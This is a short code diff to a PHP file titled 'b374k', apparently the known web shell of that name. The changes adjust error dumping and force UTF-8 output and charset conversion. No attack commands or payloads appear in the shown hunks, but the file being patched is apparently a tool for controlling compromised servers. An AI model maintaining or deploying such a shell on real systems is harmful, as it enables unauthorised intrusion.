@@ -4,7 +4,7 @@ $GLOBALS['title'] = "b374k";
 
 @ob_start();
 error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
-// register_shutdown_function(function(){ var_dump(error_get_last()); });
+register_shutdown_function(function(){ $error_last = error_get_last(); if($error_last) var_dump($error_last); });
 
 @ini_set('html_errors', '0');
 @ini_set('display_errors', '1');
@@ -325,6 +325,9 @@ if (!function_exists('execute')) {
 
 if (!function_exists('html_safe')) {
 	function html_safe($str) {
+		if (DETECT_SYS_CHARSET == 'gb2312') {
+			$str = convert_string_to_utf8($str);
+		}
 		return htmlspecialchars($str, 2 | 1);
 	}
 }
@@ -1099,15 +1102,16 @@ if (!function_exists('output')) {
 	function output($str, $charset = DETECT_SYS_CHARSET) {
 		$error = @ob_get_contents();
 
-		if (function_exists('mb_detect_encoding')) {
-			switch (mb_detect_encoding($str, "UTF-8, GB2312, ISO-8859-1, ISO-8859-15", true)) {
-			case 'UTF-8':
-				$charset = 'utf-8';
-				break;
-			default:
-				break;
-			}
-		}
+		$charset = 'utf-8';
+		// if (function_exists('mb_detect_encoding')) {
+		// 	switch (mb_detect_encoding($str, "UTF-8, GB2312, ISO-8859-1, ISO-8859-15", true)) {
+		// 	case 'UTF-8':
+		// 		$charset = 'utf-8';
+		// 		break;
+		// 	default:
+		// 		break;
+		// 	}
+		// }
 
 		@ob_end_clean();
 		header("Content-Type: text/plain;charset=" . $charset);
